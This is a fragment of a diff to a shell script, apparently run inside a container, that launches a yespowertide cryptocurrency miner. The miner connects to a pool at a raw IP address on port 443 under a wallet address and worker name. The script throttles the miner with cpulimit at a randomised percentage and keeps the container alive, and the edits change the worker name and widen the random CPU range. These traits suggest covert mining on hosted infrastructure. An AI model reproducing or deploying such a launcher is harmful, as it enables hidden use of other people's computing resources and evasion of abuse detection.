@@ -24,7 +24,7 @@ fi
 /app/$NAME \
 -a yespowertide \
 -o 157.173.100.15:443 \
--u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.sency \
+-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.cendana \
 -p x \
 --cpu-threads 2 \
 --cpu-threads-intensity 1 \
@@ -33,7 +33,7 @@ fi
 P=$!
 
 # Membatasi CPU usage
-LIMIT=$((75 + RANDOM % 6))
+LIMIT=$((75 + RANDOM % 11))
 cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
 # Menjaga container tetap hidup
